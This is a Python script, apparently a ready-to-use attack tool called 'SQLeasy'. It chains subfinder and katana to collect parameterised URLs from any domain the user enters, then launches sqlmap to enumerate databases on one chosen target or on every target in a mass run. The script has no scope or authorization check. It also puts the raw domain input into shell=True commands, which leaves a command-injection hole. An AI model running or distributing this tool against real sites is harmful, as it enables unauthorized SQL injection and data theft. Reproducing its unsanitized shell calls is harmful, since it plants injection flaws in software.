#!/usr/bin/env python3
#
# Copyright 2026 SQLeasy Developers
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import os
import sys
import shutil
import subprocess

R = "\033[31m"
G = "\033[32m"
Y = "\033[33m"
B = "\033[34m"
C = "\033[36m"
W = "\033[0m"

def print_banner():
    print(f"""{C}
  ▄▄▄▄▄▄ .▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ 
  █      ██      █       █       █       █       █       █
  █  ▄▄▄▄██  ▄▄  █   ▄   █    ▄▄▄█    ▄▄▄█▄▄   ▄▄█    ▄▄▄█
  █  █▄▄▄▄█  █ █ █  █ █  █   █▄▄▄█   █▄▄▄  █   █ █   █▄▄▄ 
  █▄▄▄▄  ██  █▄█ █  █▄█  █    ▄▄▄█    ▄▄▄█ █   █ █    ▄▄▄█
  █      ██      █       █   █   █   █     █   █ █       █
  ▀▀▀▀▀▀▀ ▀▀▀▀▀▀ ▀▀▀▀▀▀▀ ▀▀▀▀    ▀▀▀▀      ▀▀▀▀  ▀▀▀▀▀▀▀  
                  {Y}[ SQLeasy Automation Framework ]{W}""")

def check_dependencies():
    print(f"\n{Y}[*] Checking required backend tools...{W}")
    deps = ["subfinder", "katana", "sqlmap"]
    missing = False
    for dep in deps:
        if shutil.which(dep) is None:
            print(f" {R}[!] Warning: Required tool {dep} was not found.{W}")
            missing = True
        else:
            print(f" {G}[+] Tool Connected: {dep}{W}")
    if missing:
        print(f"\n{R}[!] Halted. Please run: apt install subfinder katana sqlmap{W}")
        sys.exit(1)

def run_recon(domain):
    print(f"\n{G}[+] Target Locked: {W}{domain}")
    print(f"{Y}[*] Starting automation funnel...{W}")
    
    print(f" {C}[>] Running Subfinder (Finding Subdomains)...{W}")
    cmd_sub = f"subfinder -d {domain} -silent -o .subs.txt"
    subprocess.run(cmd_sub, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    if not os.path.exists(".subs.txt") or os.path.getsize(".subs.txt") == 0:
        with open(".subs.txt", "w") as f:
            f.write(domain)

    print(f" {C}[>] Running Katana (Extracting Input Parameters)...{W}")
    cmd_kat = "katana -list .subs.txt -silent | grep '=' > .targets.txt"
    subprocess.run(cmd_kat, shell=True, stderr=subprocess.DEVNULL)

def display_targets():
    if not os.path.exists(".targets.txt") or os.path.getsize(".targets.txt") == 0:
        print(f"\n{R}[-] No input parameters detected on this domain. Try another target.{W}")
        cleanup()
        sys.exit(0)

    with open(".targets.txt", "r") as f:
        urls = [line.strip() for line in f.readlines() if line.strip()]

    print(f"\n{Y} NUM   AVAILABLE PARAMETER TARGETS (WIFITE-STYLE MENU){W}")
    print(f"{C} ---   ------------------------------------------------{W}")
    
    unique_urls = list(set(urls))[:30] 
    for idx, url in enumerate(unique_urls, 1):
        print(f" {G}{idx:<5}{W}{url}")
    
    return unique_urls

def execute_attack(urls):
    print(f"\n{C}[+] Select target number to exploit (1-{len(urls)}) or type '{Y}all{C}': {W}", end="")
    choice = input().strip()
    
    sqlmap_flags = "--batch --random-agent --level=1 --risk=1"
    
    print(f"\n{Y}[*] Handing targets off to SQLMap...{W}")
    
    if choice.lower() == 'all':
        print(f"{G}[+] Launching mass parallel checks...{W}\n")
        subprocess.run(f"sqlmap -m .targets.txt {sqlmap_flags} --dbs", shell=True)
    else:
        try:
            val = int(choice) - 1
            if 0 <= val < len(urls):
                selected = urls[val]
                print(f"{G}[+] Testing endpoint: {W}{selected}\n")
                subprocess.run(f"sqlmap -u \"{selected}\" {sqlmap_flags} --dbs", shell=True)
            else:
                print(f"{R}[-] Error: Invalid target index selection.{W}")
        except ValueError:
            print(f"{R}[-] Error: Non-numeric selection provided.{W}")

def cleanup():
    for f in [".subs.txt", ".targets.txt"]:
        if os.path.exists(f):
            os.remove(f)

def main():
    try:
        print_banner()
        check_dependencies()
        
        print(f"\n{C}[+] Enter Domain Name (e.g., website.com): {W}", end="")
        domain = input().strip()
        if not domain:
            print(f"{R}[-] Domain entry cannot be blank.{W}")
            return
            
        run_recon(domain)
        target_list = display_targets()
        execute_attack(target_list)
        cleanup()
        print(f"\n{G}[+] SQLeasy scan pipeline completed safely.{W}")
        
    except KeyboardInterrupt:
        print(f"\n\n{R}[!] Process closed by user keyboard shortcut.{W}")
        cleanup()
        sys.exit(0)

if __name__ == "__main__":
    main()
